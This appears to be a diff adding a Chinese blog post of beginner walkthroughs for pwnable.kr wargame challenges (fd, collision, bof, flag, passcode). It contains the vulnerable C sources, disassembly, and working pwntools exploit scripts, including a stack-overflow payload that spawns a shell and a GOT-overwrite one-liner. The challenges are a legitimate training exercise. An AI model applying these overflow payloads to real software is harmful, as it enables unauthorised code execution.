@@ -300,6 +300,496 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/07/24/pwnable/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="百浪多息">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="prontosil">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/24/pwnable/" itemprop="url">pwnable</a></h1>
+        
+
+		
+
+        <div class="post-meta">
+         
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-24T20:46:03+08:00">
+                2019-07-24
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Post modified&#58;</span>
+              
+              <time title="Post modified" itemprop="dateModified" datetime="2019-07-24T20:49:36+08:00">
+                2019-07-24
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1.7k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  8
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1>pwnable从小白开始</h1>
+<p>pwnable是一个适合小白的网站</p>
+<p>https://pwnable.kr/play.php</p>
+<h2>fd</h2>
+<p>有源码：</p>
+<p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这道题目是让你了解Linux下的文件描述符
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fd@prowl:~$ ./fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br><span class="line">fd@prowl:~$</span><br></pre></td></tr></table></figure></p>
+<h2>collision</h2>
+<p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>果然我还是小白，连最基本的常识都不懂了，意识到了是由输入的<code>argv[1]</code>来计算的，20个字节正好分成5次，就是把每四个加起来就行了。</p>
+<p>所以可以直接拿<code>0x21DD09EC</code>去除掉5就好了
+exp如下：
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pwn_ssh=ssh(host=<span class="string">'pwnable.kr'</span>,user=<span class="string">'col'</span>,password=<span class="string">'guest'</span>,port=<span class="number">2222</span>)</span><br><span class="line">print(pwn_ssh.connected())</span><br><span class="line"></span><br><span class="line">sh=pwn_ssh.process(argv=[<span class="string">'collision'</span>,<span class="string">'\xc9\xce\xc5\x06'</span>*<span class="number">4</span>+<span class="string">'\xc8\xce\xc5\x06'</span>],executable=<span class="string">'./col'</span>)</span><br><span class="line">print(sh.recvall())</span><br></pre></td></tr></table></figure></p>
+<p>这里还学到了一波用<code>pwn</code>ssh连接的。</p>
+<h2>bof</h2>
+<p>源码：
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">	gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">		system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这是一个简单的栈溢出的题目
+虽然简单，但是小白还是要仔细地分析一下的。</p>
+<p>func对应的汇编代码，其实感觉汇编代码看的更明白一些：
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:565D262C func            proc near               ; CODE XREF: main+10p</span><br><span class="line">.text:565D262C</span><br><span class="line">.text:565D262C s               = byte ptr -2Ch</span><br><span class="line">.text:565D262C var_C           = dword ptr -0Ch</span><br><span class="line">.text:565D262C arg_0           = dword ptr  8</span><br><span class="line">.text:565D262C</span><br><span class="line">.text:565D262C                 push    ebp</span><br><span class="line">.text:565D262D                 mov     ebp, esp</span><br><span class="line">.text:565D262F                 sub     esp, 48h</span><br><span class="line">.text:565D2632                 mov     eax, large gs:14h ;gs保护机制</span><br><span class="line">.text:565D2638                 mov     [ebp+var_C], eax</span><br><span class="line">.text:565D263B                 xor     eax, eax</span><br><span class="line">.text:565D263D                 mov     dword ptr [esp], offset s ; &quot;overflow me : &quot;</span><br><span class="line">.text:565D2644                 call    near ptr puts+565D2649h</span><br><span class="line">.text:565D2649                 lea     eax, [ebp+s]</span><br><span class="line">.text:565D264C                 mov     [esp], eax      ; s</span><br><span class="line">.text:565D264F                 call    near ptr gets+565D2654h</span><br><span class="line">.text:565D2654                 cmp     [ebp+arg_0], 0CAFEBABEh</span><br><span class="line">.text:565D265B                 jnz     short loc_565D266B</span><br><span class="line">.text:565D265D                 mov     dword ptr [esp], offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:565D2664                 call    near ptr system+565D2669h</span><br><span class="line">.text:565D2669                 jmp     short loc_565D2677</span><br></pre></td></tr></table></figure></p>
+<p>之前一直不太明白如果局部变量是数组该怎么搞</p>
+<p>关键是这里：
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:565D2649                 lea     eax, [ebp+s]</span><br><span class="line">.text:565D264C                 mov     [esp], eax      ; s</span><br></pre></td></tr></table></figure></p>
+<p>注意
+<code>lea eax, [ebp+s]</code>
+这里加了方括号但是其实还是地址，就是将字符串s的地址赋值给eax
+然后再将其存放到栈顶，之后调用<code>gets</code>函数，将输入的值填入到缓冲区</p>
+<p>从这张图就能明白内存的分布了
+<img src="/assets/stack2_l89iia1d5.png" alt="stack2">
+这道题目保护机制基本都开了，但是我们并不需要执行代码。只需要覆盖栈上的值就行了。也不会触发gs保护机制</p>
+<p>exp如下：</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">52</span>+<span class="string">'\xbe\xba\xfe\xca'</span></span><br><span class="line">r=remote(<span class="string">'pwnable.kr'</span>,<span class="number">9000</span>)</span><br><span class="line">print(r.connected())</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>运行效果如下：</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pxy@ubuntu:~/pwnable$ python bofexp.py</span><br><span class="line">[+] Opening connection to pwnable.kr on port 9000: Done</span><br><span class="line">True</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">bof</span><br><span class="line">bof.c</span><br><span class="line">flag</span><br><span class="line">log</span><br><span class="line">log2</span><br><span class="line">super.pl</span><br><span class="line">$ cat flag</span><br><span class="line">daddy, I just pwned a buFFer :)</span><br></pre></td></tr></table></figure></p>
+<h2>flag</h2>
+<p>这道题目被upx加壳，Linux下的加壳倒还是第一次遇到。</p>
+<p>到<a href="https://github.com/upx/upx/releases/tag/v3.95" target="_blank" rel="noopener">这里</a>可以找到脱壳的工具</p>
+<p>脱壳之后gdb载入，查看反汇编代码</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000401164 &lt;+0&gt;:	push   rbp</span><br><span class="line">   0x0000000000401165 &lt;+1&gt;:	mov    rbp,rsp</span><br><span class="line">   0x0000000000401168 &lt;+4&gt;:	sub    rsp,0x10</span><br><span class="line">   0x000000000040116c &lt;+8&gt;:	mov    edi,0x496658</span><br><span class="line">   0x0000000000401171 &lt;+13&gt;:	call   0x402080 &lt;puts&gt;</span><br><span class="line">   0x0000000000401176 &lt;+18&gt;:	mov    edi,0x64</span><br><span class="line">   0x000000000040117b &lt;+23&gt;:	call   0x4099d0 &lt;malloc&gt;</span><br><span class="line">   0x0000000000401180 &lt;+28&gt;:	mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line">   0x0000000000401184 &lt;+32&gt;:	mov    rdx,QWORD PTR [rip+0x2c0ee5]        # 0x6c2070 &lt;flag&gt;</span><br><span class="line">   0x000000000040118b &lt;+39&gt;:	mov    rax,QWORD PTR [rbp-0x8]</span><br><span class="line">   0x000000000040118f &lt;+43&gt;:	mov    rsi,rdx</span><br><span class="line">   0x0000000000401192 &lt;+46&gt;:	mov    rdi,rax</span><br><span class="line">   0x0000000000401195 &lt;+49&gt;:	call   0x400320</span><br><span class="line">   0x000000000040119a &lt;+54&gt;:	mov    eax,0x0</span><br><span class="line">   0x000000000040119f &lt;+59&gt;:	leave  </span><br><span class="line">   0x00000000004011a0 &lt;+60&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">pwndbg&gt; b *0x0000000000401184</span><br></pre></td></tr></table></figure></p>
+<p>然后在此处下断点</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">RAX  0x6c96b0 ◂— 0x0</span><br><span class="line">RBX  0x401ae0 (__libc_csu_fini) ◂— push   rbx</span><br><span class="line">RCX  0x8</span><br><span class="line">RDX  0x496628 ◂— push   rbp /* &apos;UPX...? sounds like a delivery service :)&apos; */</span><br><span class="line">RDI  0x4</span><br><span class="line">RSI  0x0</span><br><span class="line">R8   0x1</span><br><span class="line">R9   0x3</span><br><span class="line">R10  0x22</span><br></pre></td></tr></table></figure></p>
+<p>命中断点之后单步一次就行
+这时候就看到寄存器的变化</p>
+<p>flag就是那个拉2333</p>
+<h2>paascode</h2>
+<p>学到了一点从远程服务器下载东西的命令</p>
+<p><code>$ scp -P 2222 passcode@pwnable.kr:/home/passcode/passcode .</code></p>
+<p>源码：</p>
+<p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">$ cat passcode.c             </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> passcode1;</span><br><span class="line">	<span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">	fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line">	<span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">	welcome();</span><br><span class="line">	login();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// something after login...</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>作为一名小白还是要好好地分析栈帧的构造</p>
+<p>那要怎么分析程序呢？最关键的还是分析程序的交互过程，毕竟我们也是从程序的输入入手的。</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  0x804862a &lt;welcome+33&gt;    mov    eax, 0x80487dd</span><br><span class="line">  0x804862f &lt;welcome+38&gt;    lea    edx, [ebp - 0x70]</span><br><span class="line">► 0x8048632 &lt;welcome+41&gt;    mov    dword ptr [esp + 4], edx</span><br><span class="line">  0x8048636 &lt;welcome+45&gt;    mov    dword ptr [esp], eax</span><br><span class="line">  0x8048639 &lt;welcome+48&gt;    call   __isoc99_scanf@plt &lt;0x80484a0&gt;</span><br></pre></td></tr></table></figure></p>
+<p>此处是调用<code>scanf</code>函数的过程， 先将一个地址<code>0x80487dd</code>赋值给eax寄存器，之后将ebp-0x70的地址传给edx寄存器，注意到这里的操作符是<code>lea</code>
+之后再将edx寄存器的值放到栈的第二层，最后将eax寄存器的值放到栈顶。 所以调用scanf函数的时候，栈顶是<code>0x80487dd</code>，往下加4个字节存储的是一个局部变量开始的位置(就是字符串s的首地址)</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  0x804862f &lt;welcome+38&gt;    lea    edx, [ebp - 0x70]</span><br><span class="line">  0x8048632 &lt;welcome+41&gt;    mov    dword ptr [esp + 4], edx</span><br><span class="line">  0x8048636 &lt;welcome+45&gt;    mov    dword ptr [esp], eax</span><br><span class="line">► 0x8048639 &lt;welcome+48&gt;    call   __isoc99_scanf@plt &lt;0x80484a0&gt;</span><br><span class="line">       format: 0x80487dd ◂— &apos;%100s&apos;</span><br><span class="line">       vararg: 0xff8e7068 ◂— 0x28 /* &apos;(&apos; */</span><br></pre></td></tr></table></figure></p>
+<p>这是参数的传递过程
+此时栈上的布局：</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ esp  0xff8e7050 —▸ 0x80487dd ◂— and    eax, 0x73303031 /* &apos;%100s&apos; */</span><br><span class="line">01:0004│      0xff8e7054 —▸ 0xff8e7068 ◂— 0x28 /* &apos;(&apos; */</span><br></pre></td></tr></table></figure></p>
+<p>这里有一点疑惑</p>
+<p>直接查看内存</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20x 0x80487dd</span><br><span class="line">0x80487dd:	0x30303125</span><br></pre></td></tr></table></figure></p>
+<p>0x30303125 其实就是%100的小端表示！！</p>
+<p>但是换一种方式看</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20i 0x80487dd</span><br><span class="line">   0x80487dd:	and    eax,0x73303031</span><br><span class="line">   0x80487e2:	add    BYTE PTR [edi+0x65],dl</span><br></pre></td></tr></table></figure></p>
+<p>到底是数据还是指令全看程序员了</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">passcode@prowl:~$ python -c &quot;print &apos;A&apos;*96+&apos;\x04\xa0\x04\x08&apos;+str(0x080485d7)&quot; | ./passcode</span><br><span class="line">Toddler&apos;s Secure Login System 1.0 beta.</span><br><span class="line">enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�!</span><br><span class="line">enter passcode1 : Login OK!</span><br><span class="line">Sorry mom.. I got confused about scanf usage :(</span><br><span class="line">Now I can safely trust you that you have credential :)</span><br></pre></td></tr></table></figure></p>
+<p>不过这道题目我没有搞得很清楚</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/07/24/python文档阅读笔记1/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="百浪多息">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="prontosil">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/24/python文档阅读笔记1/" itemprop="url">python文档阅读笔记1</a></h1>
+        
+
+		
+
+        <div class="post-meta">
+         
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-24T20:45:43+08:00">
+                2019-07-24
+              </time>
+            
+
+            
